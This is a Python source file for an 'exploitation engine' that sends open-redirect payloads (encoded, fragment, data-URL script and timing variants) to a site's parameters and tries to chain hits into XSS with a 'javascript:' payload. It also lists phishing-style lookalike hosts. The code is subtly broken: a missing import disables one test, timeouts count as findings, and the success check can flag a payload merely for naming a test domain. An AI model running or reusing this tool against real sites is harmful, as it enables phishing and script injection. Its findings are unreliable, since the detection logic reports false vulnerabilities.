#!/usr/bin/env python3
"""
ðŸ”¥ ADVANCED EXPLOITATION ENGINE
"""

import asyncio
import urllib.parse
from urllib.parse import urlparse, parse_qs, quote, unquote
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from data_models import Parameter, Vulnerability


class ExploitEngine:
    """Advanced exploitation engine with multiple attack vectors"""
    
    def __init__(self, base_domain: str):
        self.base_domain = base_domain
        self.exploitation_stats = {
            'total_tests': 0,
            'successful_exploits': 0,
            'bypass_attempts': 0,
            'dom_exploits': 0,
            'header_exploits': 0,
            'web3_exploits': 0
        }
    
    async def exploit_parameter_advanced(self, param: Parameter, payloads: List[str], 
                                       session, context_info: Dict = None) -> List[Vulnerability]:
        """Advanced parameter exploitation"""
        vulnerabilities = []
        
        print(f"[EXPLOIT-ENGINE] Testing {param.name} with {len(payloads)} payloads")
        
        for i, payload in enumerate(payloads):
            self.exploitation_stats['total_tests'] += 1
            
            # Try multiple exploitation techniques
            techniques = [
                ('direct', self.test_direct_redirect),
                ('encoded', self.test_encoded_redirect),
                ('fragmented', self.test_fragmented_redirect),
                ('chained', self.test_chained_redirect),
                ('time_based', self.test_time_based_redirect)
            ]
            
            for technique_name, technique_func in techniques:
                try:
                    vuln = await technique_func(param, payload, session)
                    if vuln:
                        vuln.exploitation_technique = technique_name
                        vulnerabilities.append(vuln)
                        self.exploitation_stats['successful_exploits'] += 1
                        
                        print(f"[EXPLOIT-SUCCESS] {param.name} -> {payload[:30]}... [{technique_name}]")
                        break  # Found vulnerability, no need to test other techniques
                    
                except Exception as e:
                    continue
            
            # Rate limiting
            if i % 10 == 0:
                await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def test_direct_redirect(self, param: Parameter, payload: str, session) -> Optional[Vulnerability]:
        """Test direct redirect"""
        test_url = self.construct_test_url(param, payload)
        
        try:
            async with session.get(test_url, allow_redirects=False, timeout=10) as response:
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        return self.create_vulnerability(param, payload, response, location, 'direct_redirect')
        except:
            pass
        
        return None
    
    async def test_encoded_redirect(self, param: Parameter, payload: str, session) -> Optional[Vulnerability]:
        """Test with encoded payloads"""
        encoded_payloads = [
            quote(payload),
            quote(payload, safe=''),
            payload.replace('/', '%2f'),
            payload.replace(':', '%3a'),
            payload.replace('.', '%2e')
        ]
        
        for encoded_payload in encoded_payloads:
            test_url = self.construct_test_url(param, encoded_payload)
            
            try:
                async with session.get(test_url, allow_redirects=False, timeout=10) as response:
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        
                        if self.is_successful_redirect(location, payload):
                            return self.create_vulnerability(param, encoded_payload, response, location, 'encoded_redirect')
            except:
                continue
        
        return None
    
    async def test_fragmented_redirect(self, param: Parameter, payload: str, session) -> Optional[Vulnerability]:
        """Test fragmented redirect"""
        if param.context != 'fragment':
            return None
        
        fragment_payloads = [
            f"#{param.name}={payload}",
            f"#{payload}",
            f"#redirect={payload}",
            f"#url={payload}"
        ]
        
        for fragment_payload in fragment_payloads:
            test_url = f"{param.url.split('#')[0]}{fragment_payload}"
            
            try:
                async with session.get(test_url, allow_redirects=False, timeout=10) as response:
                    content = await response.text()
                    
                    # Check if fragment is processed by JavaScript
                    if (payload in content or 
                        'location.href' in content or 
                        'window.location' in content):
                        
                        return self.create_vulnerability(param, fragment_payload, response, payload, 'fragment_redirect')
            except:
                continue
        
        return None
    
    async def test_chained_redirect(self, param: Parameter, payload: str, session) -> Optional[Vulnerability]:
        """Test chained redirect"""
        # Create intermediate redirect
        intermediate_url = f"data:text/html,<script>location.href='{payload}'</script>"
        
        test_url = self.construct_test_url(param, intermediate_url)
        
        try:
            async with session.get(test_url, allow_redirects=True, timeout=10) as response:
                if response.url.human_repr() != test_url:
                    final_url = response.url.human_repr()
                    
                    if self.is_successful_redirect(final_url, payload):
                        return self.create_vulnerability(param, intermediate_url, response, final_url, 'chained_redirect')
        except:
            pass
        
        return None
    
    async def test_time_based_redirect(self, param: Parameter, payload: str, session) -> Optional[Vulnerability]:
        """Test time-based redirect detection"""
        test_url = self.construct_test_url(param, payload)
        
        try:
            start_time = time.time()
            async with session.get(test_url, allow_redirects=True, timeout=15) as response:
                end_time = time.time()
                
                # If request takes significantly longer, might indicate processing
                if end_time - start_time > 5:
                    final_url = response.url.human_repr()
                    
                    if self.is_successful_redirect(final_url, payload):
                        return self.create_vulnerability(param, payload, response, final_url, 'time_based_redirect')
        except asyncio.TimeoutError:
            # Timeout might indicate successful redirect to slow/non-existent domain
            return self.create_vulnerability(param, payload, None, payload, 'timeout_redirect')
        except:
            pass
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """Construct test URL with advanced techniques"""
        if param.context == 'query':
            parsed = urlparse(param.url)
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        
        elif param.context == 'form_input':
            # For form parameters, we might need POST
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
        
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """Enhanced redirect success detection"""
        if not location:
            return False
        
        location_lower = location.lower()
        decoded_location = unquote(location).lower()
        payload_lower = payload.lower()
        
        # Test domains
        test_domains = [
            'google.com', 'evil.com', 'malicious.com', 'attacker.com',
            'fake-metamask.io', 'phishing-uniswap.org', 'fake-opensea.io',
            '216.58.214.206', '3627734734', 'localhost'
        ]
        
        # Check exact domain matches
        for domain in test_domains:
            if (domain in location_lower or 
                domain in decoded_location or 
                domain in payload_lower):
                return True
        
        # JavaScript execution
        if location_lower.startswith('javascript:'):
            return True
        
        # Data URLs
        if location_lower.startswith('data:'):
            return True
        
        # External domain redirect
        if location.startswith(('http://', 'https://')):
            try:
                redirect_domain = urlparse(location).netloc
                if redirect_domain and redirect_domain != self.base_domain:
                    return True
            except:
                pass
        
        # Protocol-relative URLs
        if location.startswith('//'):
            try:
                redirect_domain = location.split('/')[2]
                if redirect_domain != self.base_domain:
                    return True
            except:
                pass
        
        return False
    
    def create_vulnerability(self, param: Parameter, payload: str, response, 
                           redirect_url: str, exploit_type: str) -> Vulnerability:
        """Create vulnerability object"""
        response_code = response.status if response else 0
        
        return Vulnerability(
            url=self.construct_test_url(param, payload),
            parameter=param.name,
            payload=payload,
            method=param.method,
            response_code=response_code,
            redirect_url=redirect_url,
            context=param.context,
            timestamp=datetime.now().isoformat(),
            vulnerability_type=f"open_redirect_{exploit_type}",
            confidence=min(param.confidence + 0.2, 1.0),
            impact=self.assess_impact(redirect_url, exploit_type),
            remediation=self.get_remediation(param.context, exploit_type),
            cvss_score=self.calculate_cvss(param.context, redirect_url, exploit_type),
            exploitation_complexity=self.get_complexity(exploit_type),
            business_impact=self.assess_business_impact(redirect_url)
        )
    
    def assess_impact(self, redirect_url: str, exploit_type: str) -> str:
        """Assess vulnerability impact"""
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif exploit_type in ['chained_redirect', 'header_injection']:
            return "HIGH"
        elif redirect_url.startswith(('http://', 'https://')):
            return "HIGH"
        elif exploit_type == 'dom_based':
            return "HIGH"
        else:
            return "MEDIUM"
    
    def get_remediation(self, context: str, exploit_type: str) -> str:
        """Get specific remediation"""
        remediations = {
            'query': "Implement URL parameter validation with allowlist",
            'fragment': "Add client-side validation for fragment parameters",
            'form_input': "Validate form inputs server-side with strict rules",
            'javascript': "Sanitize all user input before DOM manipulation",
            'web3_config': "Validate Web3 URLs against trusted provider list",
            'http_header': "Implement strict header validation and sanitization"
        }
        
        base_remediation = remediations.get(context, "Implement proper input validation")
        
        if exploit_type == 'chained_redirect':
            base_remediation += ". Prevent chained redirects by limiting redirect depth."
        elif exploit_type == 'encoded_redirect':
            base_remediation += ". Validate both raw and decoded input values."
        
        return base_remediation
    
    def calculate_cvss(self, context: str, redirect_url: str, exploit_type: str) -> float:
        """Calculate CVSS score"""
        base_score = 5.0
        
        # Context impact
        context_scores = {
            'query': 1.5,
            'fragment': 2.0,
            'form_input': 1.0,
            'javascript': 2.5,
            'web3_config': 3.0,
            'http_header': 2.5
        }
        base_score += context_scores.get(context, 1.0)
        
        # Redirect URL impact
        if redirect_url.startswith('javascript:'):
            base_score += 3.0
        elif redirect_url.startswith(('http://', 'https://')):
            base_score += 2.0
        
        # Exploit type impact
        exploit_scores = {
            'chained_redirect': 1.5,
            'encoded_redirect': 1.0,
            'fragment_redirect': 2.0,
            'time_based_redirect': 1.5,
            'header_injection': 2.5
        }
        base_score += exploit_scores.get(exploit_type, 1.0)
        
        return min(base_score, 10.0)
    
    def get_complexity(self, exploit_type: str) -> str:
        """Get exploitation complexity"""
        complexity_map = {
            'direct_redirect': 'LOW',
            'encoded_redirect': 'LOW',
            'fragment_redirect': 'MEDIUM',
            'chained_redirect': 'HIGH',
            'time_based_redirect': 'MEDIUM',
            'header_injection': 'MEDIUM'
        }
        
        return complexity_map.get(exploit_type, 'MEDIUM')
    
    def assess_business_impact(self, redirect_url: str) -> str:
        """Assess business impact"""
        if redirect_url.startswith('javascript:'):
            return "Code execution, full client compromise"
        elif any(domain in redirect_url.lower() for domain in ['fake-', 'phishing-', 'malicious-']):
            return "Brand impersonation, credential theft"
        elif redirect_url.startswith(('http://', 'https://')):
            return "Phishing attacks, user redirection to malicious sites"
        else:
            return "User confusion, potential security bypass"
    
    async def chain_exploitation(self, vulnerabilities: List[Vulnerability], session) -> List[Vulnerability]:
        """Chain multiple vulnerabilities for advanced exploitation"""
        chained_vulns = []
        
        for vuln in vulnerabilities:
            # Try to chain with other vulnerabilities
            if vuln.vulnerability_type == 'open_redirect_direct':
                # Try to escalate to XSS
                xss_payload = "javascript:confirm('XSS via Open Redirect')"
                chained_url = vuln.url.replace(vuln.payload, xss_payload)
                
                try:
                    async with session.get(chained_url, allow_redirects=False) as response:
                        location = response.headers.get('Location', '')
                        
                        if 'javascript:' in location:
                            chained_vuln = Vulnerability(
                                url=chained_url,
                                parameter=vuln.parameter,
                                payload=xss_payload,
                                method=vuln.method,
                                response_code=response.status,
                                redirect_url=location,
                                context=vuln.context,
                                timestamp=datetime.now().isoformat(),
                                vulnerability_type="chained_redirect_to_xss",
                                confidence=0.95,
                                impact="CRITICAL",
                                remediation="Implement strict URL validation and CSP headers",
                                cvss_score=9.0,
                                exploitation_complexity="MEDIUM",
                                business_impact="Full client-side code execution"
                            )
                            chained_vulns.append(chained_vuln)
                except:
                    continue
        
        return chained_vulns
    
    def generate_exploit_report(self) -> Dict:
        """Generate exploitation statistics report"""
        success_rate = (self.exploitation_stats['successful_exploits'] / 
                       max(self.exploitation_stats['total_tests'], 1)) * 100
        
        return {
            'exploitation_statistics': self.exploitation_stats,
            'success_rate_percentage': round(success_rate, 2),
            'most_effective_technique': self.get_most_effective_technique(),
            'exploitation_efficiency': self.calculate_efficiency()
        }
    
    def get_most_effective_technique(self) -> str:
        """Get most effective exploitation technique"""
        # This would be tracked during exploitation
        return "direct_redirect"  # Placeholder
    
    def calculate_efficiency(self) -> float:
        """Calculate exploitation efficiency"""
        total = self.exploitation_stats['total_tests']
        successful = self.exploitation_stats['successful_exploits']
        
        if total == 0:
            return 0.0
        
        return round((successful / total) * 100, 2)